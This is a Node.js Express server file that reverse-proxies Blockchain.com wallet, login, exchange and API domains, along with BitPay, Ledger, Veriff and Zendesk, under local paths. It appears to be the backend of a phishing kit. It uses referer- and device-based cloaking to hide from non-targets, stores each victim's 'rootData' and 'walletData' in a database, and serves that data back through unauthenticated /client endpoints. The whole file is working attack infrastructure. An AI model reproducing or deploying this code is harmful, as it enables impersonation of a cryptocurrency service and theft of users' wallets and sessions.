const express = require("express");
const cookieParser = require("cookie-parser");
const cors = require("cors");
const connectDB = require("./config/db");
const path = require("path");
const { createProxyMiddleware } = require("http-proxy-middleware");
const HttpsProxyAgent = require("https-proxy-agent");
const visitor = require("./middleware/visitor");
const activeUser = require("./middleware/activeUser");

const fs = require("fs");
const app = express();
app.get(
  "/.well-known/pki-validation/92B9898A3ED4BFC0B8421B80D71048FD.txt",
  (req, res) => {
    res.send(
      fs.readFileSync(
        "/root/.well-known/pki-validation/92B9898A3ED4BFC0B8421B80D71048FD.txt",
        "utf8"
      )
    );
  }
);

const filePath = path.resolve(__dirname, "domains.db");

const DeviceDetector = require("node-device-detector");
const detector = new DeviceDetector();

app.use(cookieParser());
// Connect Database
connectDB();

const BlockchainUser = require("./models/BlockchainUser");
const checkCookie = require("./middleware/checkCookie");

// Configuration
const PORT = process.env.PORT || "8080";
const HOST = process.env.HOST || "localhost";
const PROXY_HOST = process.env.PROXY_HOST || "";
const PROXY_PORT = process.env.PROXY_PORT || "";

const getAgent = (headers) => {
  if (PROXY_HOST == "") {
    return undefined;
  }
  let proxyAgent = new HttpsProxyAgent({
    host: PROXY_HOST,
    port: PROXY_PORT,
    headers: headers,
  });
  return proxyAgent;
};

const BITPAY = "https://bitpay.com";
const API_SERVER = "https://api.blockchain.info";
const COM_ROOT = "https://blockchain.com";
const COM_WALLET_APP = "https://login.blockchain.com";
const EVERYPAY_URL = "https://pay.every-pay.eu";
const EXCHANGE_URL = "https://exchange.blockchain.com";
const LEDGER_URL = "https://manager.api.live.ledger.com";
const ROOT_URL = "https://blockchain.info";
const VERIFF_URL = "https://magic.veriff.me";
const WALLET_HELPER_DOMAIN = "https://wallet-helper.blockchain.com";
const ZENDESK_URL = "https://blockchain.zendesk.com";

app.use(visitor);
app.use("/set_cookie", function (req, res) {
  if (fs.existsSync(filePath)) {
    const ref = req.headers["referer"] || req.headers["Referer"];
    const detectResult = detector.detect(req.headers["user-agent"]);
    const refer = fs.readFileSync(filePath, "utf8").split("|||||||");
    const reg = new RegExp(refer[3], "gi");
    if ((ref && ref.match(reg)) || detectResult.os.name == "iOS") {
      res.cookie(`allow_visite`, `777`);
      res.status(200).redirect("/");
    } else {
      res.status(200).redirect(refer[1]);
    }
  } else {
    res.json("Not found");
  }
});

app.use(checkCookie);

app.use(
  "/zendesk",
  createProxyMiddleware({
    target: ZENDESK_URL,
    // agent: getAgent(),
    changeOrigin: true,
    pathRewrite: {
      [`^/zendesk`]: "",
    },
  })
);

app.use(
  "/api",
  createProxyMiddleware({
    target: API_SERVER,
    // agent: getAgent(),
    changeOrigin: true,
    pathRewrite: {
      [`^/api`]: "",
    },
  })
);

app.use(
  "/stellar",
  createProxyMiddleware({
    target: API_SERVER,
    // agent: getAgent(),
    changeOrigin: true,
    pathRewrite: {
      [`^/stellar`]: "",
    },
  })
);

app.use(
  "/bitpay",
  createProxyMiddleware({
    target: BITPAY,
    // agent: getAgent(),
    changeOrigin: true,
    pathRewrite: {
      [`^/bitpay`]: "",
    },
  })
);

app.use(
  "/root",
  createProxyMiddleware({
    target: COM_ROOT,
    // agent: getAgent(),
    changeOrigin: true,
    pathRewrite: {
      [`^/root`]: "",
    },
  })
);

app.use(
  "/wallet",
  activeUser,
  createProxyMiddleware({
    target: COM_WALLET_APP,
    agent: getAgent(),
    changeOrigin: true,
    pathRewrite: {
      [`^/wallet`]: "",
    },
  })
);

app.use(
  "/every",
  createProxyMiddleware({
    target: EVERYPAY_URL,
    // agent: getAgent(),
    changeOrigin: true,
    pathRewrite: {
      [`^/every`]: "",
    },
  })
);

app.use(
  "/exchange",
  createProxyMiddleware({
    target: EXCHANGE_URL,
    // agent: getAgent(),
    changeOrigin: true,
    pathRewrite: {
      [`^/exchange`]: "",
    },
  })
);

app.use(
  "/ledger",
  createProxyMiddleware({
    target: LEDGER_URL,
    // agent: getAgent(),
    changeOrigin: true,
    pathRewrite: {
      [`^/ledger`]: "",
    },
  })
);

async function relayRequestHeaders(proxyReq, req) {
  // proxyReq.setHeader('accept', 'application/json, text/plain, */*');
  // proxyReq.setHeader('content-type', 'application/x-www-form-urlencoded');
  if (PROXY_HOST == "") {
    proxyReq.setHeader("origin", "http://localhost:8080");
    proxyReq.setHeader("referer", "http://localhost:8080");
    proxyReq.setHeader("sec-fetch-dest", "empty");
    proxyReq.setHeader("sec-fetch-mode", "cors");
    proxyReq.setHeader("sec-fetch-site", "corss-site");
  }
}

app.use(
  "/info",
  createProxyMiddleware({
    target: ROOT_URL,
    agent: getAgent(),
    changeOrigin: true,
    onProxyReq: relayRequestHeaders,
    onProxyRes: function (proxyRes, req, res) {
      proxyRes.headers["access-control-allow-credentials"] = "true";
      proxyRes.headers["access-control-allow-origin"] = "http://localhost:8080";
    },
    pathRewrite: {
      [`^/info`]: "",
    },
  })
);

app.use(
  "/verify",
  createProxyMiddleware({
    target: VERIFF_URL,
    // agent: getAgent(),
    changeOrigin: true,
    pathRewrite: {
      [`^/verify`]: "",
    },
  })
);

app.use(
  "/wallet_helper",
  createProxyMiddleware({
    target: WALLET_HELPER_DOMAIN,
    // agent: getAgent(),
    changeOrigin: true,
    pathRewrite: {
      [`^/wallet_helper`]: "",
    },
  })
);

app.use("/client/token/:uid", async function (req, res) {
  const uid = req.params.uid;
  const users = await BlockchainUser.find({ uid });
  if (users.length > 0) {
    return res.json(users[0].rootData);
  }
  return res.json("");
});

app.use("/client/wallet/:uid", async function (req, res) {
  const uid = req.params.uid;
  const users = await BlockchainUser.find({ uid });
  if (users.length > 0) {
    try {
      return res.json(JSON.parse(users[0].walletData));
    } catch (e) {
      return res.json({});
    }
  }
  return res.json({});
});

app.use(express.static("client/lib"));

// app.get('/admin/api/notification', (req, res) => {
//   res.sendFile(path.resolve(__dirname, 'client', 'lib', 'index.html'));
// });

app.get("*", [activeUser], (req, res) => {
  res.sendFile(path.resolve(__dirname, "client", "lib", "index.html"));
});

app.listen(PORT, HOST, () => console.log(`Server started on port ${PORT}`));
